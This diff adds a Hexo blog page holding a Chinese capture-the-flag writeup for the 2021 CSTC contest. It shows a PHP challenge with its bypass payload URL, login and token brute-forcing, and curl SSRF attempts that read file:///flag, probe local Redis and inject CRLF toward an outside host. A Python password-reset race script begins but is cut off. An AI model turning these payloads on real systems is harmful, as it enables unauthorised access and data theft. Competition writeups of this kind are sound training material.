@@ -1,0 +1,1492 @@
+<!DOCTYPE html>
+<html lang="zh-CN,en,default">
+  <head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.1'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/first.css" as="style">
+  
+
+  <!-- 页面元数据 -->
+  
+  <title>2021CSTC网络安全技术大赛 Writeup (持续更新) - TARI TARI</title>
+  
+    <meta name="keywords" content="ctf,比赛">
+  
+
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    <link rel="shortcut icon" type='image/x-icon' href="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/favicon/favicon.ico">
+  
+
+  <!-- import link -->
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/first.css">
+
+  
+
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/css/style.css"></noscript>
+  
+
+  <script id="loadcss"></script>
+
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        '<h1><b>抱歉，您的浏览器无法访问本站</b></h1>'+
+        '<h3>微软已经于2016年终止了对 Internet Explorer (IE) 10 及更早版本的支持，<br/>'+
+        '继续使用存在极大的安全隐患，请使用当代主流的浏览器进行访问。</h3><br/>'+
+        '<a target="_blank" rel="noopener" href="https://www.microsoft.com/zh-cn/WindowsForBusiness/End-of-IE-support"><strong>了解详情 ></strong></a>'+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+	</style>
+    <div class="kill-noscript">
+        <h1><b>抱歉，您的浏览器无法访问本站</b></h1>
+        <h3>本页面需要浏览器支持（启用）JavaScript</h3><br/>
+        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>了解详情 ></strong></a>
+    </div>
+</noscript>
+
+</head>
+
+  <body>
+    
+
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+  <div class='container'>
+  <div id='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a id="s-comment" class="fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a id="s-toc" class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+            TARI TARI
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="搜索..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-home fa-fw'></i>主页
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+    <div id="l_body">
+      <div id="l_cover">
+  
+    
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
+          
+            <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/TARI0510/TARI0510.github.io@master/img/home.jpeg"></div>
+          
+          <div class='cover-body'>
+  <div class='top'>
+    
+    
+      <p class="title">TARI TARI</p>
+    
+    
+  </div>
+  <div class='bottom'>
+    <div class='menu navigation'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+          <div id="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+        </div>
+    
+  
+  </div>
+
+      <div id="safearea">
+        <div class="body-wrapper" id="pjax-container">
+          
+
+<div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
+  
+
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        2021CSTC网络安全技术大赛 Writeup (持续更新)
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年5月6日 16:02</p>
+  </a>
+</div>
+
+          
+        
+          
+            <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-05-06T16:13:43+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年5月6日 16:13</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="2021CSTC网络安全技术大赛 Writeup (持续更新)" data-path="/2021/05/06/2021CSTC-ctf/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+          
+            
+  <div class="new-meta-item wordcount">
+    <a class='notlink'>
+      <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
+      <p>字数：1.5k字</p>
+    </a>
+  </div>
+  <div class="new-meta-item readtime">
+    <a class='notlink'>
+      <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
+      <p>时长：8分钟</p>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  
+  <meta name="referrer" content="no-referrer" />
+
+<p>这次比赛打完，发现自己还是太菜了。。</p>
+<p>虽然排名还可以 （因为有逆向大佬在。。。</p>
+<p>web2和web3 感觉接近了，现把做出来的写上</p>
+<p>看看后面有复现环境会复现，没有的话看下其他师傅的写写复盘。</p>
+<p>由于web2和3实在没思路了，然后顺手解了2个简单的杂项。</p>
+<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span>=<span class="number">0</span>;<span class="variable">$v2</span>=<span class="number">0</span>;<span class="variable">$v3</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$a</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;foo&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$a</span>))&#123;</span><br><span class="line">   is_numeric(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">if</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>])&#123;</span><br><span class="line">       (<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>]&gt;<span class="number">2021</span>)?<span class="variable">$v1</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(is_array(@<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(count(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">       <span class="variable">$pos</span> = array_search(<span class="string">&quot;nudt&quot;</span>, <span class="variable">$a</span>[<span class="string">&quot;a2&quot;</span>]);</span><br><span class="line">       <span class="variable">$pos</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       <span class="keyword">foreach</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">           <span class="variable">$val</span>===<span class="string">&quot;nudt&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$v2</span>=<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="variable">$d</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;dog&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$c</span>[<span class="number">1</span>])&#123;</span><br><span class="line">   <span class="keyword">if</span>(!strcmp(<span class="variable">$c</span>[<span class="number">1</span>],<span class="variable">$d</span>) &amp;&amp; <span class="variable">$c</span>[<span class="number">1</span>]!==<span class="variable">$d</span>)&#123;</span><br><span class="line">       eregi(<span class="string">&quot;3|1|c&quot;</span>,<span class="variable">$d</span>.<span class="variable">$c</span>[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       strpos((<span class="variable">$c</span>[<span class="number">0</span>].<span class="variable">$d</span>), <span class="string">&quot;cstc2021&quot;</span>)?<span class="variable">$v3</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> &amp;&amp; <span class="variable">$v2</span> &amp;&amp; <span class="variable">$v3</span>)&#123;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><code>bar1</code> 和 <code>bar2</code> 凑一下</p>
+<p>eregi 可 <code>%00</code> 被截断，在凑一下 <code>bar3</code> 即可</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;49.232.167.183:30001&#x2F;?foo&#x3D;&#123;%22bar1%22:%222022a%22,%22bar2%22:[[1],2,3,4,5],%22a2%22:[%22nudt%22]&#125;&amp;cat[0]&#x3D;%00cstc2021&amp;cat[1][0]&#x3D;1&amp;dog&#x3D;222</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620179402871-7de7f9bc-40b2-48f9-8db4-dd88c7c814b8.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620179402871-7de7f9bc-40b2-48f9-8db4-dd88c7c814b8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>flag{c32b71bb4aa5c4b2e7a8453f012f9c3e}</p>
+<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>提示1：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="http://49.232.167.183:30012/swagger-ui.html">http://49.232.167.183:30012/swagger-ui.html</a></p>
+</blockquote>
+<p>提示2：</p>
+<blockquote>
+<p>已经拿到管理员token的队伍，关注/home/index接口</p>
+</blockquote>
+<p>登录爆破获取token</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620196738603-c7fb0bc4-7cb0-4441-ad31-45c95afe84da.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620196738603-c7fb0bc4-7cb0-4441-ad31-45c95afe84da.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>不过这个 token 无效</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">63a44f5fd4368923e62469611d232a02</span><br></pre></td></tr></table></figure>
+
+
+
+<p>爆破 <code>/uid</code> 接口</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620198371838-dc9660fe-9e86-4fa1-81fc-c79a00ee52aa.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620198371838-dc9660fe-9e86-4fa1-81fc-c79a00ee52aa.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;用户ID&quot;:&quot;987&quot;,&quot;用户组&quot;:&quot;系统管理员&quot;,&quot;用户名&quot;:&quot;ctf_admin&quot;,&quot;HASH&quot;:&quot;2773d5bd7e1a7a7eec619c6d5fbdfd3a&quot;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;用户ID&quot;:&quot;101&quot;,&quot;用户组&quot;:&quot;普通用户&quot;,&quot;用户名&quot;:&quot;test&quot;,&quot;HASH&quot;:&quot;098f6bcd4621d373cade4e832627b4f6&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>md 碰撞出密码得到 Token</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620198529598-06e947b4-a983-4a12-ab1a-29ff8470990b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620198529598-06e947b4-a983-4a12-ab1a-29ff8470990b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9c618e664319512ef7db2d3c0672bee0</span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问不到时，会返回 <code>????</code></p>
+<p>尝试了以下 EXP和一些变形，不过都读不到 flag，，害</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://xxxx/1.txt&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://xxxx/t1.php&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=dict://127.0.0.1:6379/_info%250a&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=file:///flag&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=%66%69%6c%65%3a%2f%2f%2f%66%6c%61%67%22&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://0:30012/image/hacker.jpg&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://xxx:2233/&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://xxx5:2233/ HTTP/1.1\r\n\r\nGET / HTTP/1.1\r\nHost: 119.28.15.55:2233\r\n\r\nGET / HTTP/1.1\r\ntest:&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br><span class="line"></span><br><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://49.232.167.183:30012/&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>服务端是java来的，但感觉禁用了 file 之类的协议，，</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620204707249-1ca690ca-7ca8-4e1b-b6aa-63e83810ee73.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620204707249-1ca690ca-7ca8-4e1b-b6aa-63e83810ee73.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>不过不知道怎样利用，，卡在这了</p>
+<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>目录爆破得 <code>robots.txt</code> &gt; 然后访问 <code>PassOn</code> &gt;</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620195711423-cb1b5cc7-8c90-4173-9071-2d39973d8676.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620195711423-cb1b5cc7-8c90-4173-9071-2d39973d8676.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>&gt; 得到源码 <a target="_blank" rel="noopener" href="http://49.232.3.115:49496/PassOn/PassOnbackupDirect0ry/backup.zip">http://49.232.3.115:49496/PassOn/PassOnbackupDirect0ry/backup.zip</a></p>
+<p>结合 <code>reset.php</code> 源码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207860979-f4fa9f1b-2fe7-49d0-b6c7-cf3941de908d.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207860979-f4fa9f1b-2fe7-49d0-b6c7-cf3941de908d.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>重置密码</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207952070-efdfe4c2-fb78-4c51-a512-fc3d456b41a9.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207952070-efdfe4c2-fb78-4c51-a512-fc3d456b41a9.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
+<p>发现登录不上。。可能压根就不是改了这个密码？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="variable">$pdo</span>-&gt;prepare(<span class="string">&quot;UPDATE PassOn SET pass = :pass where id = 1&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>先试试会不会因为我和别人同时在做，试试用脚本跑，防止时间差</p>
+<p>贴贴脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line">user = <span class="string">&#x27;Ptn4rdn&#x27;</span></span><br><span class="line">passwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">email = <span class="string">&#x27;Ptn4rdn@gmail.com&#x27;</span></span><br><span class="line">loginUrl = <span class="string">&#x27;http://49.232.3.115:49496/PassOn/login.php&#x27;</span></span><br><span class="line">resetPassUrl = <span class="string">&#x27;http://49.232.3.115:49496/PassOn/reset.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resetPasswd</span>():</span></span><br><span class="line">    <span class="keyword">global</span> passwd</span><br><span class="line">    resetData = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: email,</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: user,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;reset&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    gmdate = requests.post(loginUrl, resetData).content[-<span class="number">86</span>:-<span class="number">49</span>]</span><br><span class="line">    sha1 = hashlib.sha1()</span><br><span 